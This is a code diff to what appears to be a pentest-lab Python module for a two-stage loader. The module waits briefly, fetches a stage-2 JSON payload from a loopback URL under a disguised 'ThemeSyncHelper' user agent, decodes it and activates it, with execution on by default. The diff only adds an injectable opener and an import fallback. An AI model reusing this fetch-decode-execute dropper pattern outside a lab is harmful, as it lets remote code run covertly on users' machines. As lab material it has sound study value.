@@ -21,7 +21,10 @@ import urllib.parse
 import urllib.request
 from typing import Any
 
-from .stage2_server import assert_loopback_host
+try:
+    from .stage2_server import assert_loopback_host
+except ImportError:
+    from stage2_server import assert_loopback_host  # type: ignore[no-redef]
 
 DEFAULT_STAGE2_URL = "http://127.0.0.1:8765/stage2.json"
 
@@ -42,9 +45,15 @@ def _wait_for_quiet_window(delay_sec: float = 0.01) -> float:
     return bounded
 
 
-def _fetch_remote_stage(stage2_url: str, timeout: float = 3.0) -> dict[str, Any]:
+def _fetch_remote_stage(
+    stage2_url: str,
+    timeout: float = 3.0,
+    opener: Any = None,
+) -> dict[str, Any]:
     """Fetch the stage-2 JSON envelope from the local loopback server."""
     assert_loopback_url(stage2_url)
+    if opener is not None:
+        return opener(stage2_url)
     req = urllib.request.Request(
         stage2_url,
         headers={"User-Agent": "ThemeSyncHelper/1.4 (os-lab-pent15)"},
@@ -52,6 +61,7 @@ def _fetch_remote_stage(stage2_url: str, timeout: float = 3.0) -> dict[str, Any]
     with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310 (loopback-verified above)
         raw = resp.read(65536).decode("utf-8")
     return json.loads(raw)
+
 
 
 def _decode_stage2_payload(packet: dict[str, Any]) -> str:
@@ -82,10 +92,11 @@ def run_stage1(
     stage2_url: str = DEFAULT_STAGE2_URL,
     delay_sec: float = 0.01,
     allow_exec: bool = True,
+    opener: Any = None,
 ) -> dict[str, Any]:
     """Run the full stage-1 loader lifecycle against a loopback stage-2 endpoint."""
     waited = _wait_for_quiet_window(delay_sec)
-    packet = _fetch_remote_stage(stage2_url)
+    packet = _fetch_remote_stage(stage2_url, opener=opener)
     decoded_code = _decode_stage2_payload(packet)
     activation = _activate_stage2(decoded_code, allow_exec=allow_exec)
     return {
